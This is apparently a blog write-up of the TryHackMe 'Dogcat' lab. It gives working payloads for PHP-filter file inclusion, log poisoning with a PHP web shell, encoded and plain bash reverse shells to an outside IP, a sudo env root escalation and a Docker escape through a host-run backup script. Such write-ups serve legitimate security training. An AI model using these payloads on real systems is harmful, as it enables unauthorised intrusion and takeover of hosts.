---
title: Dogcat
description: 'Exploiting an LFI and breaking out of a Docker container'
pubDate: 2023-06-09
category: 'tryhackme'
tags: ['PHP filter', 'docker escape']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/ce2fe16cfcdac475834f262306243b0a.png'
---

## LFI
It looks like the word `dog` or `cat` needs to be in the url some where. It also adds `.php` at the end of the `view`-param.

We can exploit this and get the content of the `index.php`:
```
GET /?view=php://filter/convert.base64-encode/resource=/var/www/html/cat/../index HTTP/1.1
...[snip]...
```

## RCE
In the source of the index we can see that we can set the `ext` param and access any file.

Through the LFI we can also access the apache log files and poison the logs to get RCE.

### Log poisoning

```
GET /?ext=&view=cat/../../../../../../var/log/apache2/access.log HTTP/1.1
...[snip]...
User-Agent: <?php system($_REQUEST['cmd']); ?>
...[snip]...
```

Get a reverse shell:
```
GET /?ext=&view=cat/../../../../../../var/log/apache2/access.log&cmd=echo+c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC4xMTkuMTM3LzQ0NDQgMD4mMQ==|base64+-d|bash
...[snip]...
```

## FLAG 1
There is no python (2 or 3) on the machine and it looks like a docker container.

We can upgrade our shell using the script trick:
```bash
SHELL=/bin/bash script -q /dev/null
```

## PRIV ESC
In `/opt/backups` there is a `backup.tar` file which has a copy of the container it seems.
In the `Dockerfile` we find 2 flags and:

```bash
RUN echo "www-data ALL = NOPASSWD: `which env`" >> /etc/sudoers
```

We can exploit this with a GTFOBin like to get root:
```bash
sudo /usr/bin/env /bin/sh
```

## Escaping the container
The `backup.sh` script in `/opt/backups` is run by a process outside of the container.
Since we escalated to root we can modify this script and get a shell on the host.

Add a reverse shell to the `backup.sh` script (make sure its still marked as executable: `chmod +x backups.sh):

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container

bash -i >& /dev/tcp/10.8.119.137/4444 0>&1
```

When the minute rolls over we get a reverse shell on the host.
